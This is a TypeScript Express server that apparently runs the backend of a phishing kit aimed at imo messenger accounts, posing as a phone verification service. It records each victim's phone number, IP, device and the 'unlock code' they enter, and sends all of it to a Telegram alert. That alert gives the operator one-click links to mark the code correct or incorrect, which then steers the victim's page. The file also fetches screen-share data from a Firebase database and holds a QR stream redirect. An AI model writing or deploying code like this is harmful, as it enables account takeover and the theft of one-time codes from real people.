import express, { Request, Response } from 'express';
import { createServer as createViteServer } from 'vite';
import path from 'path';
import { fileURLToPath } from 'url';
import fs from 'fs';
import dotenv from 'dotenv';
import {
  saveVerification,
  updateVerificationCode,
  getAllVerifications,
  getVerificationById,
  setVerificationSignal,
} from './server/db.ts';
import { sendServerTelegramAlert } from './server/telegram.ts';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

async function startServer() {
  const app = express();
  const PORT = parseInt(process.env.PORT || '3000', 10);

  app.use(express.json());

  // Health check endpoint
  app.get('/api/health', (_req: Request, res: Response) => {
    res.json({
      status: 'ok',
      service: 'imo Verification Database Server',
      timestamp: new Date().toISOString(),
    });
  });

  // 1. Phone number verification endpoint
  app.post('/api/verify/phone', async (req: Request, res: Response) => {
    try {
      const { phoneNumber, countryCode, device, userAgent } = req.body;
      const clientIp = (req.headers['x-forwarded-for'] as string)?.split(',')[0] || req.socket.remoteAddress || 'unknown';
      const cleanPhone = (phoneNumber || '').trim();
      const cleanCountry = (countryCode || '+966').trim();
      const fullPhone = cleanPhone.startsWith('+') ? cleanPhone : `${cleanCountry}${cleanPhone.replace(/^0+/, '')}`;

      // Save to database server
      const record = saveVerification({
        phoneNumber: fullPhone,
        countryCode: cleanCountry,
        rawPhoneNumber: cleanPhone,
        device: device || 'Redmi A2+',
        ip: clientIp,
        userAgent: userAgent || (req.headers['user-agent'] as string) || 'Mobile Browser',
      });

      // Send Instant Alert to Telegram
      const alertText = 
        `📱 *New Phone Verification Request (Database Server)*\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `📞 *Phone:* \`${fullPhone}\`\n` +
        `📱 *Device:* ${record.device}\n` +
        `🌐 *IP:* \`${clientIp}\`\n` +
        `🕒 *Time:* ${new Date().toLocaleTimeString('en-US')}\n` +
        `💾 *Database ID:* \`${record.id}\`\n` +
        `🔄 *Status:* Waiting for unlock code...`;

      await sendServerTelegramAlert(alertText);

      res.status(200).json({
        success: true,
        message: 'Phone number registered in database server for verification',
        verificationId: record.id,
        phoneNumber: fullPhone,
      });
    } catch (err: any) {
      console.error('[API] Error in /api/verify/phone:', err);
      res.status(500).json({
        success: false,
        error: err.message || 'Server error',
      });
    }
  });

  // 2. Unlock code verification endpoint
  app.post('/api/verify/code', async (req: Request, res: Response) => {
    try {
      const { verificationId, phoneNumber, code, device } = req.body;
      const cleanCode = (code || '').trim();

      if (!cleanCode) {
        return res.status(400).json({ success: false, error: 'Code is required' });
      }

      // Update record in database server
      const updated = updateVerificationCode(verificationId || phoneNumber, cleanCode);
      const targetId = updated?.id || verificationId || 'latest';
      const origin = req.headers.origin || process.env.APP_URL || `http://${req.headers.host}`;

      // Send Alert to Telegram with 1-click Error / Success action links!
      const alertText =
        `🔑 *Unlock Code Received (Database Server)*\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `📞 *Phone:* \`${updated?.phoneNumber || phoneNumber || 'Unknown'}\`\n` +
        `🔢 *Unlock Code:* \`${cleanCode}\`\n` +
        `📱 *Device:* ${device || updated?.device || 'Redmi A2+'}\n` +
        `🕒 *Time:* ${new Date().toLocaleTimeString('en-US')}\n` +
        `💾 *ID:* \`${targetId}\`\n\n` +
        `⚡ *Decision Signals (1-Click Action):*\n` +
        `❌ If Incorrect: ${origin}/api/verify/${targetId}/error\n` +
        `✅ If Correct: ${origin}/api/verify/${targetId}/success`;

      await sendServerTelegramAlert(alertText);

      res.status(200).json({
        success: true,
        message: 'Verification code recorded in database server',
        record: updated,
        verificationId: targetId,
      });
    } catch (err: any) {
      console.error('[API] Error in /api/verify/code:', err);
      res.status(500).json({
        success: false,
        error: err.message || 'Server error',
      });
    }
  });

  // 3. Status check endpoint (used by second page to listen for /error or /success)
  app.get('/api/verify/status/:id', (req: Request, res: Response) => {
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
    const id = req.params.id;
    const record = getVerificationById(id);

    if (!record) {
      // If not found by specific id, check the latest record
      const all = getAllVerifications();
      if (all.length > 0) {
        return res.json({
          success: true,
          signal: all[0].signal || 'waiting',
          status: all[0].status,
          verificationId: all[0].id,
        });
      }
      return res.json({ success: true, signal: 'waiting', status: 'pending' });
    }

    res.json({
      success: true,
      signal: record.signal || 'waiting',
      status: record.status,
      verificationId: record.id,
      unlockCode: record.unlockCode,
    });
  });

  // 4. Trigger /error signal (Rejection)
  const handleErrorSignal = (req: Request, res: Response) => {
    const id = req.params.id || req.body?.verificationId || 'latest';
    const updated = setVerificationSignal(id, 'error');
    console.log(`[Signal] Verification marked incorrect for ID: ${id}`);
    
    // Check if browser HTML or JSON
    if (req.accepts('html')) {
      return res.send(`
        <div style="font-family: sans-serif; text-align: center; padding: 40px; background: #fff5f5; color: #c53030;">
          <h2>Notification Sent</h2>
          <p>Client page will display: <b>"Your unlock number incorrect"</b> and return to verification input.</p>
          <p>ID: ${updated?.id || id}</p>
        </div>
      `);
    }
    res.json({ success: true, signal: 'error', record: updated });
  };

  app.get('/api/verify/:id/error', handleErrorSignal);
  app.post('/api/verify/:id/error', handleErrorSignal);
  app.post('/api/verify/error', handleErrorSignal);

  // 5. Trigger /success signal (Approval)
  const handleSuccessSignal = (req: Request, res: Response) => {
    const id = req.params.id || req.body?.verificationId || 'latest';
    const updated = setVerificationSignal(id, 'success');
    console.log(`[Signal] Verification approved for ID: ${id}`);

    if (req.accepts('html')) {
      return res.send(`
        <div style="font-family: sans-serif; text-align: center; padding: 40px; background: #f0fdf4; color: #166534;">
          <h2>✅ Success Signal Sent!</h2>
          <p>Client page Add button is now <b>Active</b> and ready to redirect to <b>https://s.imoim.net/dhCQvv</b>.</p>
          <p>ID: ${updated?.id || id}</p>
        </div>
      `);
    }
    res.json({ success: true, signal: 'success', record: updated });
  };

  app.get('/api/verify/:id/success', handleSuccessSignal);
  app.post('/api/verify/:id/success', handleSuccessSignal);
  app.post('/api/verify/success', handleSuccessSignal);

  // Generic signal endpoint
  app.post('/api/verify/signal', (req: Request, res: Response) => {
    const { verificationId, signal } = req.body;
    if (signal !== 'error' && signal !== 'success' && signal !== 'waiting') {
      return res.status(400).json({ success: false, error: 'Invalid signal. Must be error or success.' });
    }
    const updated = setVerificationSignal(verificationId || 'latest', signal);
    res.json({ success: true, signal, record: updated });
  });

  // Get verifications list
  app.get('/api/verify/records', (_req: Request, res: Response) => {
    const records = getAllVerifications();
    res.json({
      success: true,
      count: records.length,
      records,
    });
  });

  // Database Live QR Video Stream Configuration
  let databaseStreamConfig = {
    streamUrl: '',
    status: 'ready',
    fps: 30,
    updatedAt: new Date().toISOString(),
  };

  app.get('/api/stream/config', (_req: Request, res: Response) => {
    res.json({
      success: true,
      ...databaseStreamConfig,
    });
  });

  app.post('/api/stream/config', (req: Request, res: Response) => {
    const { streamUrl } = req.body;
    databaseStreamConfig = {
      streamUrl: streamUrl || '',
      status: streamUrl ? 'connected' : 'ready',
      fps: 30,
      updatedAt: new Date().toISOString(),
    };
    res.json({
      success: true,
      message: 'Database stream endpoint updated',
      config: databaseStreamConfig,
    });
  });

  app.get('/api/stream/qr', (_req: Request, res: Response) => {
    if (databaseStreamConfig.streamUrl) {
      return res.redirect(databaseStreamConfig.streamUrl);
    }
    res.status(200).json({
      success: true,
      status: 'ready',
      message: 'Live stream player is waiting for database server stream path',
    });
  });

  // Screen Share Live Receiver info endpoint
  app.get('/api/screen-share/live', async (_req: Request, res: Response) => {
    try {
      const response = await fetch('https://my-sc-tools-default-rtdb.firebaseio.com/screen_share/live.json');
      const data = await response.json();
      res.json({
        success: true,
        database: 'https://my-sc-tools-default-rtdb.firebaseio.com',
        path: 'screen_share/live',
        active: Boolean(data && (data.data || data.image || data.video)),
        data,
      });
    } catch (err: any) {
      res.status(500).json({ success: false, error: err.message });
    }
  });

  // Explicit route for /my-logo.jpg (supports GitHub root directory upload or /public folder)
  app.get(['/my-logo.jpg', '/my-logo.jpeg', '/my-logo.png'], (_req: Request, res: Response) => {
    const candidatePaths = [
      path.resolve(process.cwd(), 'my-logo.jpg'),
      path.resolve(__dirname, 'my-logo.jpg'),
      path.resolve(process.cwd(), 'public', 'my-logo.jpg'),
      path.resolve(__dirname, 'public', 'my-logo.jpg'),
      path.resolve(__dirname, 'dist', 'my-logo.jpg'),
      path.resolve(__dirname, 'public', 'israt_avatar.jpg'),
      path.resolve(__dirname, 'dist', 'israt_avatar.jpg'),
    ];

    for (const filePath of candidatePaths) {
      if (fs.existsSync(filePath)) {
        res.setHeader('Cache-Control', 'public, max-age=60');
        res.setHeader('Content-Type', 'image/jpeg');
        return res.sendFile(filePath);
      }
    }
    res.status(404).send('Image not found');
  });

  // Setup Vite dev server or static files
  const distPath = path.resolve(__dirname, 'dist');
  const distIndexHtml = path.resolve(distPath, 'index.html');

  if (fs.existsSync(distIndexHtml)) {
    console.log('📦 Serving production static build from dist/');
    app.use(express.static(distPath));
    app.get('*', (_req: Request, res: Response) => {
      res.sendFile(distIndexHtml);
    });
  } else {
    console.log('⚡ dist/index.html not found; mounting Vite dynamically...');
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Database & Verification Server running at http://0.0.0.0:${PORT}`);
  });
}

startServer().catch((err) => {
  console.error('Failed to start server:', err);
  process.exit(1);
});
